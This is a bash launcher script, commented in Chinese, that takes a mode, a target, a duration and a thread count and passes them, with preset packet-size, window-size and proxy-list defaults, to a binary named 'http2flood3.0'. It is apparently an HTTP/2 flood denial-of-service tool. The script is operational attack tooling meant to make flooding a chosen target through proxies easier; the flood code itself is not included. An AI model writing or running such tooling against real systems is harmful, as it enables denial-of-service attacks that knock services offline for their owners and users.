#!/bin/bash

# ==========================================
# 检查是否输入了前 4 个必填参数
# 如果没输够，提示用法并退出
# ==========================================
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]; then
    echo "用法: ./cc <参数1> <参数2> <参数3> <参数4>"
    echo "示例: ./cc 模式 目标 时间 线程"
    exit 1
fi

# ==========================================
# 自动补全后面 5 个默认值
# 你可以在这里修改默认配置
# ==========================================
DEFAULT_P5="64"        # 默认值5 (例如: 线程数)
DEFAULT_P6="65555"     # 默认值6 (例如: 超时)
DEFAULT_P7="16384b"    # 默认值7 (例如: 发包大小)
DEFAULT_P8="131072b"   # 默认值8 (例如: 窗口大小)
DEFAULT_P9="proxy.txt" # 默认值9 (例如: 代理文件)

# ==========================================
# 执行副脚本
# 格式: ./http2flood3.0 [你输入的4个] [自动补全的5个]
# ==========================================
echo "正在启动: ./http2flood3.0 $1 $2 $3 $4 $DEFAULT_P5 $DEFAULT_P6 $DEFAULT_P7 $DEFAULT_P8 $DEFAULT_P9"

./http2flood3.0 "$1" "$2" "$3" "$4" "$DEFAULT_P5" "$DEFAULT_P6" "$DEFAULT_P7" "$DEFAULT_P8" "$DEFAULT_P9"
